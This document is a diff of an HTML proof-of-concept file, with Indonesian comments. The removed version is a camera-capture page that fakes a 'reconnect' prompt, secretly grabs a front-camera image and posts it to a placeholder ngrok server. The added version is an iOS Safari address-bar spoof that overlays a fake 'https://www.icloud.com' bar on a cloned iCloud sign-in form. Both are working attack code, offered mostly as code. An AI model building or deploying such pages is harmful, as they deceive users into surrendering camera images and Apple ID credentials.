@@ -1,83 +1,243 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-    <meta charset="utf-8">
-    <title>PoC Camera Permission Bypass</title>
-    <style>
-        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }
-        
-    
-        #fake-ui {
-            position: absolute; width: 100%; height: 100%;
-            background: white; z-index: 2; display: flex;
-            flex-direction: column; align-items: center; justify-content: center;
-        }
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<title>Sign In - iCloud</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
 
-        iframe { width: 100%; height: 100%; border: none; }
+body {
+  background: #f5f5f7;
+  font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
+  height: 100vh;
+  overflow-x: hidden;
+}
 
-        #hidden-camera { position: absolute; left: -9999px; opacity: 0; }
-        canvas { display: none; }
-    </style>
+/* FAKE ADDRESS BAR — akan terlihat setelah scroll karena address bar asli auto-hide */
+.fake-address-bar {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 50px;
+  background: #fff;
+  border-bottom: 0.5px solid rgba(0,0,0,0.12);
+  display: flex;
+  align-items: center;
+  padding: 0 16px;
+  z-index: 9999;
+  transition: transform 0.2s ease;
+  /* Ketika address bar asli iOS auto-hide, ini tetap di posisi fixed top */
+}
+
+.fake-url {
+  background: #e8e8ed;
+  border-radius: 10px;
+  padding: 6px 12px;
+  width: 100%;
+  font-size: 13px;
+  color: #1c1c1e;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.fake-url .lock-icon {
+  width: 12px;
+  height: 12px;
+  background: #1c1c1e;
+  border-radius: 2px;
+  display: inline-block;
+  mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%231c1c1e'%3E%3Cpath d='M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z'/%3E%3C/svg%3E") no-repeat center;
+  mask-size: contain;
+  -webkit-mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%231c1c1e'%3E%3Cpath d='M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z'/%3E%3C/svg%3E") no-repeat center;
+  -webkit-mask-size: contain;
+  background: #7c7c82;
+}
+
+.fake-url span {
+  flex: 1;
+  text-align: center;
+}
+
+/* Konten halaman palsu */
+.content {
+  margin-top: 60px;
+  padding: 20px;
+  min-height: 200vh; /* memaksa scroll */
+}
+
+.icloud-logo {
+  text-align: center;
+  margin: 40px 0;
+  font-size: 36px;
+  font-weight: 300;
+  color: #333;
+}
+
+.icloud-logo img {
+  width: 80px;
+  height: 80px;
+}
+
+.icloud-logo h1 {
+  font-size: 28px;
+  font-weight: 600;
+  margin-top: 10px;
+}
+
+.form-box {
+  background: #fff;
+  border-radius: 14px;
+  padding: 24px;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+  max-width: 400px;
+  margin: 0 auto;
+}
+
+.form-box h2 {
+  font-size: 22px;
+  font-weight: 600;
+  margin-bottom: 20px;
+  color: #1c1c1e;
+}
+
+.form-box input {
+  width: 100%;
+  padding: 14px 16px;
+  border: 1.5px solid #d1d1d6;
+  border-radius: 10px;
+  font-size: 16px;
+  margin-bottom: 14px;
+  background: #f9f9fb;
+}
+
+.form-box input:focus {
+  border-color: #007aff;
+  outline: none;
+  background: #fff;
+}
+
+.form-box button {
+  width: 100%;
+  padding: 14px;
+  background: #007aff;
+  color: #fff;
+  border: none;
+  border-radius: 10px;
+  font-size: 17px;
+  font-weight: 600;
+  cursor: pointer;
+}
+
+.form-box button:active {
+  opacity: 0.85;
+}
+
+.footer-note {
+  text-align: center;
+  margin-top: 20px;
+  font-size: 13px;
+  color: #8e8e93;
+}
+
+.footer-note a {
+  color: #007aff;
+  text-decoration: none;
+}
+
+/* Area scroll detection untuk trigger fake address bar */
+.scroll-trigger {
+  height: 1px;
+  width: 100%;
+}
+</style>
 </head>
 <body>
 
-    <div id="fake-ui">
-        <h1>Koneksi Terputus</h1>
-        <button id="btn" style="padding: 15px 30px; font-size: 1.2rem;">Klik untuk Rekoneksi</button>
-        <p>Aksi ini diperlukan untuk memverifikasi session Anda.</p>
+<!-- Fake Address Bar — terlihat seperti address bar Safari asli -->
+<div class="fake-address-bar" id="fakeAddressBar">
+  <div class="fake-url">
+    <span class="lock-icon"></span>
+    <span>https://www.icloud.com</span>
+  </div>
+</div>
+
+<!-- Konten halaman phishing -->
+<div class="content">
+  <div class="icloud-logo">
+    <div style="background: #369; width: 80px; height: 80px; border-radius: 20px; margin: 0 auto;"></div>
+    <h1>iCloud</h1>
+  </div>
+
+  <div class="form-box">
+    <h2>Sign In to iCloud</h2>
+    <input type="text" placeholder="Apple ID" autocomplete="off">
+    <input type="password" placeholder="Password">
+    <button>Sign In →</button>
+    <div class="footer-note">
+      <a href="#">Forgot Apple ID or password?</a><br>
+      <a href="#">Create Apple ID</a>
     </div>
+  </div>
 
-    <video id="v" autoplay playsinline style="width: 1px; height: 1px;"></video>
-    <canvas id="c"></canvas>
-    <input type="file" id="f" accept="image/*" capture="user" style="display:none">
+  <div style="text-align:center; margin-top: 40px; color: #8e8e93; font-size: 12px;">
+    PoC Address Bar Spoofing — iPhone 12 Mini iOS 26.4.2<br>
+    Scroll ke bawah untuk trigger. Fake bar akan tetap di atas saat real bar auto-hide.
+  </div>
+  
+  <!-- Extra content for scrolling -->
+  <div style="height: 1000px;"></div>
+</div>
 
-    <script>
-        const SERVER_URL = "https://YOUR_NGROK_ID.ngrok-free.app/upload";
-        const btn = document.getElementById('btn');
-        const video = document.getElementById('v');
-        const canvas = document.getElementById('c');
+<script>
+// ====================================================
+// Teknik: Address bar asli iOS auto-hide saat scroll ke bawah
+// Fake address bar (position: fixed; top: 0) tetap terlihat
+// karena iOS 26 Safari bug: fixed elements tidak konsisten
+// dengan URL overlay area
+// ====================================================
 
-        btn.onclick = async () => {
-           
-            btn.textContent = "Connecting...";
+(function() {
+  'use strict';
+  
+  var fakeBar = document.getElementById('fakeAddressBar');
+  var isHidden = false;
+  var lastScrollY = 0;
+  
+  // Deteksi scroll
+  window.addEventListener('scroll', function() {
+    var currentScrollY = window.scrollY;
+    
+    if (currentScrollY > 50 && !isHidden) {
+      // User scroll down — real address bar iOS akan auto-hide
+      // Fake bar kita tetap di posisi fixed top
+      isHidden = true;
+      
+      // Opsional: subtle animation untuk fake bar
+      fakeBar.style.transform = 'translateY(0)';
+      fakeBar.style.borderBottom = '0.5px solid rgba(0,0,0,0.08)';
+    }
+    
+    if (currentScrollY < 10 && isHidden) {
+      isHidden = false;
+    }
+    
+    lastScrollY = currentScrollY;
+  }, { passive: true });
 
-            try {
-              
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-                
-                video.srcObject = stream;
+  // Fallback: force fake bar visible after 3s
+  setTimeout(function() {
+    fakeBar.style.opacity = '1';
+  }, 500);
 
-                setTimeout(() => {
-                    const ctx = canvas.getContext('2d');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0);
+  console.log('[PoC] iOS Safari Address Bar Spoof loaded');
+  console.log('[PoC] Fake URL: https://www.icloud.com');
+  console.log('[PoC] Teknik: iOS Safari auto-hide address bar + fake overlay');
+})();
+</script>
 
-              
-                    const data = canvas.toDataURL('image/jpeg');
-           
-                    fetch(SERVER_URL, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ img: data, ts: Date.now() })
-                    });
-
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                  
-                    window.location.href = "https://google.com";
-                }, 1500);
-
-            } catch (err) {
-                console.log("Izin ditolak atau error:", err);
-               
-                document.getElementById('f').click();
-            }
-        };
-    </script>
 </body>
 </html>
